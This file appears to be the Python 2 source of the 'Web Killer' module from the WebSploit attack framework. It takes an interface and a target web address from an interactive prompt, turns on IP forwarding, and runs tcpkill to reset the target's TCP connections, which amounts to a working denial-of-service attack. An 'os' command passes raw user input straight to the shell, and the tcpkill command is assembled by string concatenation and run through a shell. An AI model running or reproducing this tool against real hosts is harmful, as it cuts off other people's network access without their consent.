#!/usr/bin/env python
#
# WebSploit Framework Web Killer (TCPKill) module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from time import sleep
from core import wcolors
from core import help
options =["eth0", "www.google.com"]
def webkiller():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "WebKiller" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        com = com.lower()
        if com[0:13] =='set interface':
            options[0] = com[14:20]
            print "INTERFACE => ", options[0]
            webkiller()
        elif com[0:10] =='set target':
            options[1] = com[11:]
            print "TARGET => ", options[1]
            webkiller()
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "Interface\t"+options[0]+"\t\t\t\tyes\tNetwork Interface Name"
            print "TARGET\t\t"+options[1]+"\t\t\tyes\tTarget Web Address"
            print ""
            webkiller()
        elif com[0:2] =='os':
            os.system(com[3:])
            webkiller()
        elif com[0:4] =='help':
            help.help()
            webkiller()
        elif com[0:4] =='back':
            pass
        elif com[0:3] =='run':
            print (wcolors.color.BLUE + "[*]IP Forwarding ..." + wcolors.color.ENDC)
            subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            sleep(2)
            command_1 = 'tcpkill -i ' + options[0] +' -9 host ' + options[1]
            subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            line_3 = wcolors.color.GREEN + "[*]Attack Has Been Started, For Stop Attack Press [enter] Key..." + wcolors.color.ENDC
            press_ak = raw_input(line_3)
            os.system('killall tcpkill')
            print (wcolors.color.BOLD + wcolors.color.BLUE + "[*]Attack Has Been Stoped." + wcolors.color.ENDC)
        else:
            print "Wrong Command => ", com
            webkiller()
    except(KeyboardInterrupt):
        print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
